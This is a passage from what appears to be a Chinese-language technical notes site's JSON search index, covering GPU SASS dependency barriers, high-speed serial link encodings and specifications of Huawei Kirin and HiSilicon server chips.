200b\u5728\u200b\u8bbf\u5b58\u200b\u6307\u4ee4\u200b\u8bfb\u53d6\u200b\u64cd\u4f5c\u6570\u200b\u4e4b\u524d\u200b\u53d1\u5c04\u200b\u5e76\u200b\u4fee\u6539\u200b\u4e86\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u8bbf\u5b58\u200b\u6307\u4ee4\u200b\u62ff\u5230\u200b\u7684\u200b\u5c31\u662f\u200b\u9519\u8bef\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u503c\u200b\u4e86\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u9488\u5bf9\u200b\u8fd9\u79cd\u200b\u60c5\u51b5\u200b\uff0c\u200b\u9700\u8981\u200b\u8bbe\u7f6e\u200b read barrier\uff0c\u200b\u5982\u200b\uff1a</p> <pre><code>[B------:R0:W-:-:S09]          /*0060*/                   STL [R1], R2 ;                                                 /* 0x0000000201007387 */\n/* snip */\n[B0-----:R-:W-:-:S01]          /*0170*/                   IMAD.MOV.U32 R2, RZ, RZ, R0 ;                                  /* 0x000000ffff027224 */\n</code></pre> <p>0060 STL \u200b\u6307\u4ee4\u200b\u8bbe\u7f6e\u200b\u4e86\u200b read barrier 0\uff0c0170 IMAD \u200b\u6307\u4ee4\u200b\u6807\u8bb0\u200b\u4e86\u200b\u4f1a\u200b\u7b49\u5f85\u200b barrier 0\u3002\u200b\u90a3\u4e48\u200b\uff0c\u200b\u53ea\u6709\u200b\u5f53\u200b 0060 STL \u200b\u6307\u4ee4\u200b\u5b8c\u6210\u200b\u4e86\u200b\u5b83\u200b\u7684\u200b\u64cd\u4f5c\u6570\u200b R2 \u200b\u7684\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u5141\u8bb8\u200b 0170 IMAD \u200b\u6307\u4ee4\u200b\u53bb\u200b\u5199\u5165\u200b R2 \u200b\u5bc4\u5b58\u5668\u200b\u3002\u200b\u5728\u200b GPGPU \u200b\u4e0a\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u7ea6\u675f\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u7b80\u5316\u200b\u4e3a\u200b\uff0c\u200b\u53ea\u6709\u200b\u5f53\u200b 0060 STL \u200b\u6307\u4ee4\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u5141\u8bb8\u200b\u53d1\u5c04\u200b 0170 IMAD \u200b\u6307\u4ee4\u200b\u3002</p> <p>\u200b\u53e6\u4e00\u65b9\u9762\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u8bbf\u5b58\u200b\u7b49\u200b\u5ef6\u8fdf\u200b\u4e0d\u200b\u786e\u5b9a\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5982\u679c\u200b\u5b83\u200b\u7684\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b\u662f\u200b\u540e\u7eed\u200b\u6307\u4ee4\u200b\u7684\u200b\u6e90\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u5199\u540e\u200b\u8bfb\u200b\uff08RAW\uff09\uff0c\u200b\u6b64\u65f6\u200b\u4ec5\u9760\u200b stall count \u200b\u65e0\u6cd5\u200b\u4fdd\u8bc1\u200b\u540e\u7eed\u200b\u6307\u4ee4\u200b\u6267\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u524d\u9762\u200b\u7684\u200b\u6307\u4ee4\u200b\u5df2\u7ecf\u200b\u628a\u200b\u7ed3\u679c\u200b\u5199\u5165\u200b\u5230\u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u8bbe\u7f6e\u200b write barrier\uff1a</p> <pre><code>[B------:R-:W0:-:S01]          /*0070*/                   LDS R5, [UR4] ;                                    /* 0x00000004ff057984 */\n[B------:R-:W-:Y:S03]          /*0080*/                   ULDC.64 UR4, c[0x0][0x118] ;                       /* 0x0000460000047ab9 */\n[B0-----:R-:W-:-:S01]          /*0090*/                   STG.E [R2.64], R5 ;                                /* 0x0000000502007986 */\n</code></pre> <p>0070 LDS \u200b\u6307\u4ee4\u200b\u4f1a\u200b\u5199\u5165\u200b R5\uff0cR5 \u200b\u5bc4\u5b58\u5668\u200b\u4f1a\u200b\u88ab\u200b 0090 STG \u200b\u6307\u4ee4\u200b\u8bfb\u53d6\u200b\u3002\u200b\u56e0\u6b64\u200b 0070 LDS \u200b\u6307\u4ee4\u200b\u8bbe\u7f6e\u200b write barrier 0\uff0c\u200b\u53ea\u6709\u200b\u5f53\u200b\u5b83\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b\uff0c\u200b\u628a\u200b\u7ed3\u679c\u200b\u5199\u5165\u200b\u5230\u200b R5 \u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u624d\u80fd\u200b\u5141\u8bb8\u200b 0090 STG \u200b\u6307\u4ee4\u200b\u53bb\u200b\u8bfb\u53d6\u200b R5 \u200b\u5bc4\u5b58\u5668\u200b\u3002\u200b\u5728\u200b GPGPU \u200b\u4e0a\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u7ea6\u675f\u200b\u53ef\u80fd\u200b\u7b80\u5316\u200b\u4e3a\u200b\uff0c\u200b\u53ea\u6709\u200b\u5f53\u200b 0070 LDS \u200b\u6307\u4ee4\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b\uff0c\u200b\u624d\u200b\u5141\u8bb8\u200b\u53d1\u5c04\u200b 0090 STG \u200b\u8d28\u91cf\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\uff0c\u200b\u5e76\u975e\u200b\u6240\u6709\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u90fd\u200b\u9700\u8981\u200b\u8bbe\u7f6e\u200b barrier\u3002\u200b\u4f8b\u5982\u200b\u4e0a\u9762\u200b\u8fd9\u200b\u6bb5\u200b\u6c47\u7f16\u200b\uff0c0080 ULDC \u200b\u9700\u8981\u200b\u5199\u200b UR4 \u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u800c\u200b 0070 LDS \u200b\u9700\u8981\u200b\u5199\u200b UR4 \u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b\u8bfb\u540e\u200b\u5199\u200b\uff08WAR\uff09\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u770b\u4f3c\u200b\u9700\u8981\u200b read dependency barrier\u3002\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\uff0cULDC \u200b\u548c\u200b LDS \u200b\u5e94\u8be5\u200b\u90fd\u200b\u5728\u200b LD/ST \u200b\u5355\u5143\u200b\u4e2d\u200b\u6267\u884c\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5b83\u4eec\u200b\u5185\u90e8\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u987a\u5e8f\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u8bfb\u9519\u200b\u503c\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u5217\u4e3e\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u89c2\u5bdf\u200b\u5230\u200b\u4f1a\u200b\u4f7f\u7528\u200b write dependency barrier \u200b\u7684\u200b\u6307\u4ee4\u200b\uff1a</p> <ul> <li>BMOV</li> <li>DADD</li> <li>HMMA</li> <li>I2F</li> <li>LDGDEPBAR</li> <li>LDG</li> <li>LDL</li> <li>LDSM</li> <li>LDS</li> <li>S2R</li> <li>S2UR</li> <li>QSPC</li> </ul> <p>\u200b\u9664\u4e86\u200b BMOV \u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u6307\u4ee4\u200b\u53ef\u80fd\u200b\u662f\u200b\u53ef\u53d8\u200b\u5ef6\u8fdf\u200b\u7684\u200b\u3002</p> <p>\u200b\u4e00\u4e9b\u200b\u89c2\u5bdf\u200b\u5230\u200b\u4f1a\u200b\u4f7f\u7528\u200b read dependency barrier \u200b\u7684\u200b\u6307\u4ee4\u200b\uff1a</p> <ul> <li>BMOV</li> <li>HMMA</li> <li>LDG</li> <li>LDGSTS</li> <li>LDL</li> <li>LDS</li> <li>STG</li> <li>STL</li> <li>STS</li> </ul> <p>\u200b\u9664\u4e86\u200b BMOV \u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u6307\u4ee4\u200b\u8bfb\u53d6\u200b\u64cd\u4f5c\u6570\u200b\u7684\u200b\u65f6\u95f4\u200b\u53ef\u80fd\u200b\u662f\u200b\u4e0d\u200b\u786e\u5b9a\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/high_speed_serial.html","title":"\u9ad8\u901f\u200b\u4e32\u884c\u200b\u901a\u4fe1","text":""},{"location":"hardware/high_speed_serial.html#_2","title":"\u4ecb\u7ecd","text":"<p>\u200b\u5386\u53f2\u200b\u4e0a\u200b\uff0c\u200b\u82af\u7247\u200b\u95f4\u200b\u7684\u200b\u4f20\u8f93\u200b\u63a5\u53e3\u200b\u7ecf\u5386\u200b\u4e86\u200b\u4e32\u884c\u200b\u5230\u200b\u5e76\u884c\u200b\u518d\u200b\u5230\u200b\u4e32\u884c\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u3002\u200b\u4ece\u200b\u4e32\u884c\u200b\u5230\u200b\u5e76\u884c\u200b\uff0c\u200b\u662f\u56e0\u4e3a\u200b\u5e76\u884c\u63a5\u53e3\u200b\u540c\u65f6\u200b\u4f20\u8f93\u200b\u591a\u8def\u200b\u6570\u636e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u5e26\u5bbd\u200b\u3002\u200b\u4ece\u200b\u5e76\u884c\u200b\u518d\u200b\u56de\u5230\u200b\u4e32\u884c\u200b\uff0c\u200b\u662f\u56e0\u4e3a\u200b\u968f\u7740\u200b\u5e76\u884c\u200b\u4fe1\u53f7\u200b\u6570\u200b\u589e\u5927\u200b\uff0cPCB \u200b\u8d70\u7ebf\u200b\u6108\u53d1\u200b\u56f0\u96be\u200b\uff0c\u200b\u4e32\u6270\u200b\u95ee\u9898\u200b\u6108\u53d1\u200b\u4e25\u91cd\u200b\uff0c\u200b\u96be\u4ee5\u200b\u7ee7\u7eed\u200b\u6269\u5c55\u200b\u5e76\u884c\u63a5\u53e3\u200b\u7684\u200b\u5bbd\u5ea6\u200b\u3002\u200b\u53e6\u4e00\u65b9\u9762\u200b\uff0c\u200b\u968f\u7740\u200b\u6280\u672f\u200b\u7684\u200b\u53d1\u5c55\u200b\uff0c\u200b\u4e32\u884c\u200b\u901a\u4fe1\u200b\u53d1\u5c55\u200b\u51fa\u200b\u4e86\u200b\u65b0\u200b\u7684\u200b\u6280\u672f\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u901f\u5ea6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53c8\u200b\u4ece\u200b\u5e76\u884c\u200b\u56de\u5230\u200b\u4e86\u200b\u4e32\u884c\u200b\u3002</p> <p>\u200b\u5176\u4e2d\u200b\u53d1\u6325\u200b\u91cd\u8981\u200b\u4f5c\u7528\u200b\u7684\u200b\u662f\u200b SerDes\uff0c\u200b\u5b83\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u4e32\u200b\u5e76\u200b\u8f6c\u6362\u200b\uff1a\u200b\u5728\u200b\u53d1\u9001\u200b\u7aef\u200b\uff0c\u200b\u628a\u200b\u82af\u7247\u200b\u5185\u90e8\u200b\u7684\u200b\u5e76\u884c\u200b\u6570\u636e\u200b\u8f6c\u6362\u200b\u4e3a\u200b\u4e32\u884c\u200b\u6570\u636e\u200b\u8f93\u51fa\u200b\uff1b\u200b\u5728\u200b\u63a5\u6536\u7aef\u200b\uff0c\u200b\u628a\u200b\u4e32\u884c\u200b\u6570\u636e\u200b\u8f93\u5165\u200b\u8f6c\u6362\u200b\u4e3a\u200b\u82af\u7247\u200b\u5185\u90e8\u200b\u7684\u200b\u5e76\u884c\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u53c2\u8003\u8d44\u6599\u200b\uff1aFrom Parallel to Serial and Back Again: Understanding SerDes</p>"},{"location":"hardware/high_speed_serial.html#_3","title":"\u4e32\u884c\u200b\u901a\u4fe1","text":"<p>\u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b\u9ad8\u901f\u200b\u7684\u200b\u4e32\u884c\u200b\u901a\u4fe1\u200b\uff0c\u200b\u9700\u8981\u200b\u5f88\u591a\u200b\u6280\u672f\u200b\u6765\u200b\u4fdd\u8bc1\u200b\u9ad8\u9891\u7387\u200b\u4e0b\u200b\u6570\u636e\u200b\u7684\u200b\u6b63\u5e38\u200b\u4f20\u8f93\u200b\uff1a</p> <ol> <li>\u200b\u5dee\u5206\u200b\u4fe1\u53f7\u200b\u4f20\u8f93\u200b</li> <li>\u200b\u5185\u5d4c\u200b\u65f6\u949f\u200b\u4ee5\u53ca\u200b\u65f6\u949f\u200b\u6062\u590d\u200b</li> <li>\u200b\u6570\u636e\u7f16\u7801\u200b</li> <li>\u200b\u9884\u200b\u52a0\u91cd\u200b\u548c\u200b\u5747\u8861\u200b\uff1a</li> </ol> <p>\u200b\u5e38\u89c1\u200b\u7684\u200b SerDes \u200b\u901f\u7387\u200b\u6709\u200b\uff1a3.125 Gb/s\uff0c6 Gb/s\uff0c10 Gb/s\uff0c28 GB/s\uff0c56 GB/s \u200b\u548c\u200b 112 Gb/s\u3002\u200b\u8fd9\u662f\u200b\u7ecf\u8fc7\u200b\u6570\u636e\u7f16\u7801\u200b\u540e\u200b\u7684\u200b\u901f\u7387\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5b9e\u9645\u200b\u4f20\u8f93\u200b\u7684\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u8fd8\u8981\u200b\u51cf\u53bb\u200b\u4e00\u90e8\u5206\u200b\u3002</p> <p>\u200b\u5f88\u591a\u200b\u9ad8\u901f\u200b\u534f\u8bae\u200b\u91c7\u7528\u200b\u4e86\u200b\u4e32\u884c\u200b\u901a\u4fe1\u200b\uff1a</p> <ul> <li>PCIe</li> <li>USB 3</li> <li>Ethernet</li> <li>SGMII</li> <li>Infiniband</li> <li>SATA/SAS</li> </ul> <p>\u200b\u5e38\u89c1\u200b\u7684\u200b\u6570\u636e\u7f16\u7801\u200b\u65b9\u5f0f\u200b\u6709\u200b 4b/5b\uff0c8b/10b\uff0c64/66b \u200b\u548c\u200b 128/130b\u30024b/5b \u200b\u7684\u200b\u610f\u601d\u200b\u5c31\u662f\u200b\u6bcf\u200b 4 bit \u200b\u7684\u200b\u6570\u636e\u200b\u4f1a\u200b\u88ab\u200b\u7f16\u7801\u200b\u6210\u200b 5 bit\uff0c\u200b\u5176\u4ed6\u200b\u4e5f\u200b\u662f\u200b\u7c7b\u4f3c\u200b\u3002\u200b\u7f16\u7801\u200b\u540e\u200b\uff0c\u200b\u4fdd\u8bc1\u200b 1 \u200b\u548c\u200b 0 \u200b\u7684\u200b\u4e2a\u6570\u200b\u57fa\u672c\u76f8\u540c\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u6709\u200b\u8db3\u591f\u200b\u7684\u200b\u8fb9\u6cbf\u200b\u7528\u4e8e\u200b\u65f6\u949f\u200b\u6062\u590d\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u4e0d\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u4f20\u8f93\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\u4e86\u200b\uff0c\u200b\u63a5\u6536\u200b\u4fa7\u200b\u4ece\u200b\u6570\u636e\u200b\u4e2d\u200b\u6062\u590d\u200b\u65f6\u949f\u200b\u5e76\u4e14\u200b\u91c7\u6837\u200b\u3002</p> <p>\u200b\u9884\u5148\u200b\u52a0\u91cd\u200b\u548c\u200b\u5747\u8861\u200b\u89e3\u51b3\u200b\u7684\u200b\u662f\u200b\u4f20\u8f93\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u9ad8\u9891\u200b\u4fe1\u53f7\u200b\u7684\u200b\u8870\u51cf\u200b\uff1a\u200b\u65e2\u7136\u200b\u4f20\u8f93\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u5bf9\u200b\u9ad8\u9891\u200b\u4fe1\u53f7\u200b\u8870\u51cf\u200b\u7684\u200b\u6bd4\u8f83\u200b\u5389\u5bb3\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u5728\u200b\u53d1\u9001\u200b\u7684\u200b\u65f6\u5019\u200b\u9884\u5148\u200b\u589e\u52a0\u200b\u9ad8\u9891\u200b\u4fe1\u53f7\u200b\u5206\u91cf\u200b\uff1b\u200b\u5747\u8861\u200b\u5219\u200b\u662f\u200b\u5728\u200b\u63a5\u6536\u7aef\u200b\u8fdb\u884c\u200b\u6ee4\u6ce2\u200b\uff0c\u200b\u628a\u200b\u60f3\u8981\u200b\u7684\u200b\u9891\u7387\u200b\u8fc7\u6ee4\u51fa\u6765\u200b\u3002</p> <p>\u200b\u5f53\u200b\u63a5\u53e3\u200b\u9700\u8981\u200b\u66f4\u200b\u9ad8\u5e26\u5bbd\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u901a\u5e38\u200b\u5c31\u662f\u200b\u7ec4\u5408\u200b\u591a\u4e2a\u200b SerDes\uff0c\u200b\u4f8b\u5982\u200b PCIe x1 \u200b\u5c31\u662f\u200b Serdes \u200b\u4e00\u6536\u200b\u4e00\u53d1\u200b\uff1bPCIe x16 \u200b\u5c31\u662f\u200b SerDes \u200b\u5341\u516d\u200b\u6536\u200b\u5341\u516d\u200b\u53d1\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u5217\u4e3e\u200b\u4e00\u4e9b\u200b\u9ad8\u901f\u200b\u4e32\u884c\u200b\u901a\u4fe1\u534f\u8bae\u200b\u91c7\u7528\u200b\u7684\u200b\u6280\u672f\u200b\uff1a</p> <ol> <li>PCIe 1.0-2.0: NRZ, 8b/10b</li> <li>PCIe 3.0-5.0: NRZ, 128b/130b</li> <li>PCIe 6.0: PAM-4, FEC, 242B/256B FLIT</li> <li>HDMI 1.0-2.0:8b/10b</li> <li>HDMI 2.1:16b/18b, FEC</li> <li>DisplayPort 1.0-1.4:8b/10b</li> <li>DisplayPort 2.0-2.1:128b/132b, FEC</li> <li>SGMII\uff1a8b/10b</li> <li>SATA\uff1a8b/10b</li> <li>SAS 1-3:8b/10b</li> <li>SAS 4:128b/150b, FEC</li> </ol>"},{"location":"hardware/huawei.html","title":"\u534e\u4e3a\u200b\u82af\u7247","text":""},{"location":"hardware/huawei.html#_2","title":"\u9e92\u9e9f","text":""},{"location":"hardware/huawei.html#9000s","title":"\u9e92\u9e9f\u200b 9000s","text":"<ul> <li>\u200b\u9996\u53d1\u200b\uff1aMate 60</li> <li>1x \u200b\u5927\u6838\u200b\uff080xd02\uff09\uff0c3x \u200b\u4e2d\u6838\u200b\uff080xd42\uff09\uff0c4x \u200b\u5c0f\u6838\u200b Cortex-A510</li> <li>\u200b\u5927\u6838\u200b\u4e2d\u200b\u6838\u6709\u200b\u8d85\u7ebf\u7a0b\u200b</li> <li>\u200b\u9a6c\u826f\u200b 910</li> <li>\u200b\u4e1d\u5370\u200b Hi36A0 GFCV120</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>\u200b\u9e92\u9e9f\u200b 9000s \u200b\u82af\u7247\u200b\u6027\u80fd\u200b\u8be6\u7ec6\u200b\u89e3\u6790\u200b\u2014\u2014\u200b\u534e\u4e3a\u200b mate60 \u200b\u7cfb\u5217\u200b\uff01</li> <li>Kirin 9000S Review: How Powerful is Huawei Mate60 Pro?</li> </ul>"},{"location":"hardware/huawei.html#9010","title":"\u9e92\u9e9f\u200b 9010","text":"<ul> <li>\u200b\u9996\u53d1\u200b\uff1aPura 70</li> <li>1x \u200b\u5927\u6838\u200b\uff080xd03\uff0c\u200b\u6700\u5927\u200b 2.3 GHz\uff09\uff0c3x \u200b\u4e2d\u6838\u200b\uff080xd42\uff0c\u200b\u6700\u5927\u200b 2.18 GHz\uff09\uff0c4x \u200b\u5c0f\u6838\u200b Cortex-A510\uff08impl 0x41, part 0xd46\uff0c\u200b\u6700\u5927\u200b 1.55 GHz\uff09</li> <li>2+6+4=12 \u200b\u7ebf\u7a0b\u200b</li> <li>all CPU features: fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp asimdrdm jscvt fcma lrcpc dcpop sha3 sm3 sm4 asimddp sha512 sve asimdfhm dit uscat ilrcpc flagm ssbs sb paca pacg dcpodp flagm2 frint svei8mm svebf16 i8mm bf16 bti</li> <li>\u200b\u5927\u6838\u200b\u4e2d\u200b\u6838\u6709\u200b\u8d85\u7ebf\u7a0b\u200b</li> <li>\u200b\u9a6c\u826f\u200b 910</li> <li>\u200b\u4e1d\u5370\u200b Hi36A0 GFCV121</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>\u200b\u534e\u4e3a\u200b Pura70 \u200b\u80fd\u6548\u200b\u5206\u6790\u200b\uff1a\u200b\u67b6\u6784\u200b\u8fdb\u6b65\u200b\u5f88\u5927\u200b\uff01</li> <li>HiSilicon Kirin 9010</li> <li>Huawei\u2019s Kirin 9010 Is a Reality Check for China\u2019s Semiconductor Ambitions</li> </ul>"},{"location":"hardware/huawei.html#9020","title":"\u9e92\u9e9f\u200b 9020","text":"<ul> <li>\u200b\u9996\u53d1\u200b\uff1aMate 70</li> <li>1x \u200b\u5927\u6838\u200b\uff080xd05\uff09\uff0c3x \u200b\u4e2d\u6838\u200b\uff0c4x \u200b\u5c0f\u6838\u200b</li> <li>\u200b\u5927\u6838\u200b\u4e2d\u200b\u6838\u6709\u200b\u8d85\u7ebf\u7a0b\u200b</li> <li>\u200b\u9a6c\u826f\u200b 920</li> <li>\u200b\u4e1d\u5370\u200b Hi36C0 GFCV110</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>Huawei Mate 70 Pro+: Exploring the HiSilicon Kirin 9020 Processor</li> <li>Details on the new Kirin 9020 chipset surface, here's what is inside the new Mate 70 series</li> <li>HiSilicon Kirin 9020 from Mate 70 Pro Plus - Die Analysis</li> <li>\u200b\u534e\u4e3a\u200b Mate70 Pro+ \u200b\u6027\u80fd\u200b\u5206\u6790\u200b\uff1a\u200b\u9e92\u9e9f\u200b 9020 \u200b\u6765\u200b\u5566\u200b\uff01</li> <li>HUAWEI PLA-AL10</li> </ul>"},{"location":"hardware/huawei.html#9020-on-pura-x","title":"\u9e92\u9e9f\u200b 9020 on Pura X","text":"<ul> <li>\u200b\u4e1d\u5370\u200b Hi36C0 GFCV111</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>\u200b\u534e\u4e3a\u200b Pura X \u200b\u53d1\u552e\u200b\u7b2c\u4e00\u200b\u65f6\u95f4\u200b\u53c8\u200b\u6d88\u8d39\u200b\u4e86\u200b\uff01\u200b\u4eca\u5e74\u200b\u6700\u200b\u60ca\u559c\u200b\u7684\u200b\u62c6\u89e3\u200b\uff0c\u200b\u5168\u65b0\u200b\u7684\u200b 9020 \u200b\u6362\u200b\u5c01\u88c5\u200b\u5de5\u827a\u200b\u4e86\u200b\uff0cCPU \u200b\u4e0d\u200b\u4e00\u6837\u200b\u4e86\u200b\uff01</li> </ul>"},{"location":"hardware/huawei.html#x90-on-matebook-pro","title":"\u9e92\u9e9f\u200b X90 on MateBook Pro","text":"<ul> <li>20 threads</li> <li>part id 0xd03\uff088 threads\uff0c\u200b\u53ef\u80fd\u200b\u662f\u200b 4 \u200b\u6838\u200b\uff0c\u200b\u540c\u200b\u9e92\u9e9f\u200b 9010 \u200b\u5927\u6838\u200b\uff09, 0xd43\uff088 threads\uff0c\u200b\u53ef\u80fd\u200b\u662f\u200b 4 \u200b\u6838\u200b\uff09, 0xd42\uff084 threads\uff0c\u200b\u53ef\u80fd\u200b\u662f\u200b 2 \u200b\u6838\u200b\uff0c\u200b\u540c\u200b\u9e92\u9e9f\u200b 9010 \u200b\u4e2d\u6838\u200b\uff09</li> <li>Features: fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp cpuid asimdrdm jscvt fcma lrcpc dcpop sha3 sm3 sm4 asimddp sha512 sve asimdfhm dit uscat ilrcpc flagm ssbs sb paca pacg dcpodp flagm2 frint svei8mm svebf16 i8mm bf16 dgh bti ecv</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>\u3010\u200b\u8001\u6234\u200b\u3011\u200b\u7ee7\u7eed\u200b\u6765\u200b\u6298\u817e\u200b\u9e3f\u8499\u200b\u7535\u8111\u200b\uff01\u200b\u6709\u200b\u4f60\u4eec\u200b\u6700\u200b\u5173\u5fc3\u200b\u7684\u200b CPU \u200b\u4fe1\u606f\u200b\uff0c\u200b\u8bbe\u5907\u200b\u6811\u957f\u200b\u5565\u6837\u200b\uff0c\u200b\u5305\u200b\u7ba1\u7406\u200b\u80fd\u200b\u4e0d\u80fd\u200b\u7528\u200b...</li> <li>\u200b\u5982\u4f55\u200b\u770b\u5f85\u200b\u5728\u200b 5 \u200b\u6708\u200b 8 \u200b\u65e5\u200b\u9e3f\u8499\u200b\u7535\u8111\u200b\u6280\u672f\u200b\u4e0e\u200b\u751f\u6001\u200b\u6c9f\u901a\u200b\u4f1a\u4e0a\u200b\u4eae\u76f8\u200b\u7684\u200b\u9996\u6b3e\u200b\u9e3f\u8499\u200b\u7535\u8111\u200b\uff0c\u200b\u6709\u200b\u54ea\u4e9b\u200b\u4fe1\u606f\u200b\u503c\u5f97\u200b\u5173\u6ce8\u200b\uff1f - \u200b\u96f7\u71da\u97f3\u200b\u7684\u200b\u56de\u7b54\u200b - \u200b\u77e5\u4e4e\u200b</li> </ul>"},{"location":"hardware/huawei.html#hip","title":"hip","text":""},{"location":"hardware/huawei.html#hip07","title":"hip07","text":"<ul> <li>hip07 from DSDT oem table id</li> <li>hi1616</li> <li>kunpeng 916</li> <li>Cortex-A72</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>kernel/arch/arm64/kvm/hisilicon/hisi_virt.c</li> <li>A Quick Look at the Huawei HiSilicon Kunpeng 920 Arm Server CPU</li> <li>Kunpeng 916 (Hi1616) - HiSilicon</li> </ul>"},{"location":"hardware/huawei.html#hip08","title":"hip08","text":"<ul> <li>tsv110</li> <li>part id 0xd01</li> <li>No SVE</li> <li>\u200b\u534e\u4e3a\u200b\u4e91\u200b kc1 \u200b\u5b9e\u4f8b\u200b</li> <li>hip08 from DSDT oem table id</li> <li>hi1620</li> <li>kunpeng 920</li> <li>2.6 GHz</li> <li>Features: fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp cpuid asimdrdm jscvt fcma dcpop asimddp asimdfhm</li> <li>HIP08 appears in ACPI: <code>ACPI: XSDT 0x000000002F5DFE98 0000B4 (v01 HISI   HIP08    00000000 HISI 20151124)</code></li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>kernel/arch/arm64/kvm/hisilicon/hisi_virt.c</li> <li>A Quick Look at the Huawei HiSilicon Kunpeng 920 Arm Server CPU</li> <li>config/arm: add Hisilicon kunpeng</li> </ul>"},{"location":"hardware/huawei.html#hip09","title":"hip09","text":"<ul> <li>ARMv8.5-A</li> <li>SVE (256 bits)</li> <li>part id 0xd02\uff0c\u200b\u548c\u200b\u9e92\u9e9f\u200b 9000s \u200b\u5927\u6838\u200b\u4e00\u6837\u200b</li> <li>\u200b\u534e\u4e3a\u200b\u4e91\u200b kc2 \u200b\u5b9e\u4f8b\u200b</li> <li>kunpeng 930</li> <li>Features: fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp cpuid asimdrdm jscvt fcma lrcpc dcpop sha3 sm3 sm4 asimddp sha512 sve asimdfhm dit uscat ilrcpc flagm ssbs sb dcpodp flagm2 frint svei8mm svef32mm svef64mm svebf16 i8mm bf16 dgh rng bti ecv</li> <li>64KB L1 Cache, 512KB L2 Cache</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>Add hip09 machine discribtion</li> <li>config/arm: add Hisilicon kunpeng</li> <li>[SME] Recover hip09 and hip11 in aarch64-cores.def</li> <li>SVE_256</li> <li>hip09_prefetch_tune</li> </ul>"},{"location":"hardware/huawei.html#hip09a","title":"hip09a","text":"<p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>ACPI/IORT: Add PMCG platform information for HiSilicon HIP09A</li> </ul>"},{"location":"hardware/huawei.html#hip10","title":"hip10","text":"<ul> <li>ARMv8.5-A</li> <li>SVE</li> <li>part id 0xd03\uff0c\u200b\u548c\u200b\u9e92\u9e9f\u200b 9010 \u200b\u5927\u6838\u200b\u4e00\u6837\u200b</li> </ul> <p>\u200b\u6765\u6e90\u200b\uff1a</p> <ul> <li>kernel/arch/arm64/kvm/hisilicon/hisi_virt.c</li> <li>dpdk/config/arm/meson.build</li> </ul>"},{"location":"hardware/huawei.html#hip10a","title":"hip10a","text":"<ul> <li>ARMv8.5-A</li> <li>SVE + SVE2 (256 bits)</li> <li>part id 